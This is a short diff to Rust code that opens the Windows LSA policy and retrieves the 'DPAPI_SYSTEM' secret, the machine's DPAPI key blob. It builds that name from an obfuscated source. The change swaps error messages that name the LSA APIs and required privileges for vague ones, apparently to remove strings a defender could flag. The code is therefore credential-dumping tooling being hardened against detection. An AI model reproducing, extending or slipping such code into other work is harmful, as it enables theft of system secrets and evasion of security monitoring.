@@ -103,10 +103,10 @@ fn run() -> Result<(), &'static str> {
             POLICY_GET_PRIVATE_INFORMATION,
             &mut policy,
         )
-    }.map_err(|_| "LsaOpenPolicy resolve failed")?;
+    }.map_err(|_| "resolve failed")?;
 
     if rc != STATUS_SUCCESS {
-        return Err("LsaOpenPolicy failed — requires SYSTEM or SeSecurityPrivilege");
+        return Err("lsa open failed");
     }
 
     // Build "DPAPI_SYSTEM" UTF-16 in a stack buffer from the obfuscated source.
@@ -130,11 +130,11 @@ fn run() -> Result<(), &'static str> {
             &key as *const _ as *const u8,
             &mut private_data,
         )
-    }.map_err(|_| "LsaRetrievePrivateData resolve failed")?;
+    }.map_err(|_| "resolve failed")?;
 
     if rc2 != STATUS_SUCCESS || private_data.is_null() {
         unsafe { let _ = lsa_close(policy); };
-        return Err("LsaRetrievePrivateData failed");
+        return Err("lsa data failed");
     }
 
     // private_data points to an LSA_UNICODE_STRING containing the DPAPI key blob
